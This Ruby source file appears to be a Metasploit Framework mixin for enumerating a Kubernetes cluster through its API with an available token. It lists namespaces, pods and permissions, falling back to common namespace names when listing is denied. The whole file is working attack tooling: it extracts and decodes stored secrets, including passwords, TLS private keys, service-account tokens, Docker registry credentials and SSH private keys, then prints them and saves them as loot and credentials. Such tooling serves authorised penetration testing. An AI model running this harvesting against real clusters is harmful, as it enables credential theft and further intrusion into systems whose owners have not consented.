# -*- coding: binary -*-

# The mixin for enumerating a Msf::Exploit::Remote::HTTP::Kubernetes API
module Msf::Exploit::Remote::HTTP::Kubernetes::Enumeration
  def initialize(info = {})
    super

    register_options(
      [
        Msf::OptString.new('NAMESPACE_LIST', [false, 'The default namespace list to iterate when the current token does not have the permission to retrieve the available namespaces', 'default,dev,staging,production,kube-public,kube-node-lease,kube-lease,kube-system'])
      ]
    )
  end

  def enum_all
    token_claims = parse_jwt(api_token)
    output.print_claims(token_claims) if token_claims

    enum_version
    namespace_items = enum_namespaces
    namespaces_name = namespace_items.map { |item| item.dig(:metadata, :name) }

    # If there's no permissions to access namespaces, we can use the current token's namespace,
    # as well as trying some common namespaces
    if namespace_items.empty?
      current_token_namespace = token_claims&.dig('kubernetes.io', 'namespace')
      possible_namespaces = (datastore['NAMESPACE_LIST'].split(',') + [current_token_namespace]).uniq.compact
      namespaces_name += possible_namespaces

      output.print_error("Unable to extract namespaces. Attempting the current token's namespace and common namespaces: #{namespaces_name.join(', ')}")
    end

    # Split the information for each namespace separately
    namespaces_name.each.with_index do |namespace, index|
      print_good("Namespace #{index}: #{namespace}")

      enum_auth(namespace)
      enum_pods(namespace)
      enum_secrets(namespace)

      print_line
    end
  end

  def enum_version
    version = nil
    attempt_enum(:version) do
      version = kubernetes_client.get_version
      output.print_version(version)
    end
    version
  end

  def enum_namespaces(name: nil)
    output.print_good('Enumerating namespaces')

    namespace_items = []
    attempt_enum(:namespace) do
      if name
        namespace_items = [kubernetes_client.get_namespace(name)]
      else
        namespace_items = kubernetes_client.list_namespaces.fetch(:items, [])
      end
    end
    output.print_namespaces(namespace_items)
    namespace_items
  end

  def enum_auth(namespace)
    attempt_enum(:auth) do
      auth = kubernetes_client.list_auth(namespace)
      output.print_auth(namespace, auth)
    end
  end

  def enum_pods(namespace, name: nil)
    attempt_enum(:pod) do
      if name
        pods = [kubernetes_client.get_pod(name, namespace)]
      else
        pods = kubernetes_client.list_pods(namespace).fetch(:items, [])
      end

      output.print_pods(namespace, pods)
    end
  end

  def enum_secrets(namespace, name: nil)
    attempt_enum(:secret) do
      if name
        secrets = [kubernetes_client.get_secret(name, namespace)]
      else
        secrets = kubernetes_client.list_secrets(namespace).fetch(:items, [])
      end

      output.print_secrets(namespace, secrets)
      report_secrets(namespace, secrets)
    end
  end

  protected

  attr_reader :kubernetes_client, :output

  def attempt_enum(resource, &block)
    block.call
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
    output.print_enum_failure(resource, e)
  end

  def report_secrets(namespace, secrets)
    origin = create_credential_origin_service(
      {
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'kubernetes',
        protocol: 'tcp',
        module_fullname: fullname,
        workspace_id: myworkspace_id
      }
    )

    secrets.each do |secret|
      credential_data = {
        origin: origin,
        origin_type: :service,
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      resource_name = secret.dig(:metadata, :name)
      loot_name_prefix = [
        datastore['RHOST'],
        namespace,
        resource_name,
        secret[:type].gsub(/[a-zA-Z]/, '-').downcase
      ].join('_')

      case secret[:type]
      when Msf::Exploit::Remote::HTTP::Kubernetes::Secret::BasicAuth
        username = Rex::Text.decode_base64(secret.dig(:data, :username))
        password = Rex::Text.decode_base64(secret.dig(:data, :password))

        credential = credential_data.merge(
          {
            username: username,
            private_type: :password,
            private_data: password
          }
        )

        print_good("basic_auth #{resource_name}: #{username}:#{password}")
        create_credential(credential)
      when Msf::Exploit::Remote::HTTP::Kubernetes::Secret::TLSAuth
        tls_cert = Rex::Text.decode_base64(secret.dig(:data, :"tls.crt"))
        tls_key = Rex::Text.decode_base64(secret.dig(:data, :"tls.key"))
        tls_subject = begin
          OpenSSL::X509::Certificate.new(tls_cert).subject
        rescue StandardError
          nil
        end
        loot_name = loot_name_prefix + (tls_subject ? tls_subject.to_a.map { |name, data, _type| "#{name}-#{data}" }.join('-') : '')

        path = store_loot('tls.key', 'text/plain', nil, tls_key, "#{loot_name}.key")
        print_good("tls_key #{resource_name}: #{path}")

        path = store_loot('tls.cert', 'application/x-pem-file', nil, tls_cert, "#{loot_name}.crt")
        print_good("tls_cert #{resource_name}: #{path} (#{tls_subject || 'No Subject'})")
      when Msf::Exploit::Remote::HTTP::Kubernetes::Secret::ServiceAccountToken
        data = secret[:data].clone
        # decode keys to a human readable format that might be useful for users
        %i[namespace token].each do |key|
          data[key] = Rex::Text.decode_base64(data[key])
        end
        loot_name = loot_name_prefix + '.json'
        path = store_loot('kubernetes.token', 'application/json', datastore['RHOST'], JSON.pretty_generate(data), loot_name)
        print_good("service token #{resource_name}: #{path}")
      when Msf::Exploit::Remote::HTTP::Kubernetes::Secret::DockerConfigurationJson
        json = Rex::Text.decode_base64(secret.dig(:data, :".dockerconfigjson"))
        loot_name = loot_name_prefix + '.json'

        path = store_loot('docker.json', 'application/json', nil, json, loot_name)
        print_good("dockerconfig json #{resource_name}: #{path}")
      when Msf::Exploit::Remote::HTTP::Kubernetes::Secret::SSHAuth
        data = Rex::Text.decode_base64(secret.dig(:data, :"ssh-privatekey"))
        loot_name = loot_name_prefix + '.key'
        private_key = parse_private_key(data)

        credential = credential_data.merge(
          {
            private_type: :ssh_key,
            public_data: private_key&.public_key,
            private_data: private_key
          }
        )
        begin
          create_credential(credential)
        rescue StandardError => _e
          vprint_error("Unable to store #{loot_name} as a valid ssh_key pair")
        end

        path = store_loot('id_rsa', 'text/plain', nil, data, loot_name)
        print_good("ssh_key #{resource_name}: #{path}")
      end
    rescue StandardError => e
      elog("Failed parsing secret #{resource_name}", error: e)
      print_error("Failed parsing secret #{resource_name}: #{e.message}")
    end
  end

  def parse_private_key(data)
    passphrase = nil
    ask_passphrase = false

    private_key = Net::SSH::KeyFactory.load_data_private_key(data, passphrase, ask_passphrase)
    private_key
  rescue StandardError => _e
    nil
  end

  def parse_jwt(token)
    parsed_token = Msf::Exploit::Remote::HTTP::JWT.decode(token)
    parsed_token.payload
  rescue ArgumentError
    nil
  end
end
